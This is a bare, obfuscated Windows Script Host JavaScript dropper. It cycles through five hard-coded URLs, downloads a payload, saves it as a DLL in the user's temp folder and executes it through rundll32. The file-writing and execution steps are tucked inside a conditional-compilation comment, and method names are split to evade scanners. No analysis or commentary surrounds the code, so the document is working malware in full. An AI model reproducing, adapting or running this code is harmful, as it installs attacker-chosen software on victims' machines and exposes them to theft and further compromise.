var ZNe7=1;
var DRu5=2;
var YPu0 = "http://";
    var JSv3 = [YPu0 + "goodswand.net/2lex9",YPu0 + "nasosy76.ru/f230s",YPu0 + "eddermiaul.net/2yr5egml",YPu0 + "hostingforall.gr/demqa",YPu0 + "ledetdom.ru/ef6wxcl"];
var FZl6 = "Uf8A4GUps";
var NAu8=2;
var QEk7="437";
var RHs5=WScript["CreateObject"]("WScript.Shell");
var NSu9=RHs5.ExpandEnvironmentStrings("%T"+"EMP%/");
var NWk8=NSu9 + FZl6;
var Hl2=NWk8 + ".d" + "ll";
var MOo5 = RHs5["Environment"]("System");
if (MOo5("PROCESSOR_ARCHITECTURE").toLowerCase() == "amd64")
{
var Gp1 = RHs5.ExpandEnvironmentStrings("%SystemRoot%\\SysWOW64\\rundll32.exe");
}
else
{
var Gp1 = RHs5["ExpandEnvironmentStrings"]("%SystemRoot%\\system32\\rundll32.exe");
}
var Zy5=["MSXML2.XMLHTTP", "WinHttp.WinHttpRequest.5.1"];
for (var El1=0; El1 < Zy5["length"]; El1++)
{
try
{
var Fk7=WScript["CreateObject"](Zy5[El1]);
break;
}
catch (e)
{
continue;
}
};
var BSx9 = new ActiveXObject("Scripting.FileSystemObject");
function Tc4()
{
var VSd7 = BSx9.GetFile(Hl2);
return VSd7.ShortPath;
}
var Yg1 = 0;
for (var Kd4 = 0; Kd4 < JSv3.length; Kd4 = Kd4 + 1)
{
try
{
Fk7["open"]("GET", JSv3[Kd4], false);
Fk7["send"]();
while (Fk7.readystate < 4) WScript["Sleep"](100);
var HEj5=this["WScript"]["CreateObject"]("ADODB.Stream");
HEj5["open"]();
HEj5.type=ZNe7;
/*@cc_on
HEj5.write(Fk7.ResponseBody);
HEj5.position=0;
HEj5['Sav'+'eT'+'oFile'](Hl2,    NAu8);
HEj5.close();
var If5 = Tc4();
var d = new Date();
d.setFullYear("2015");
RHs5["Run"](Gp1 + " " + If5 + ",0005");
@*/
break;
}
catch (e) {continue;};
}
WScript.Quit(0);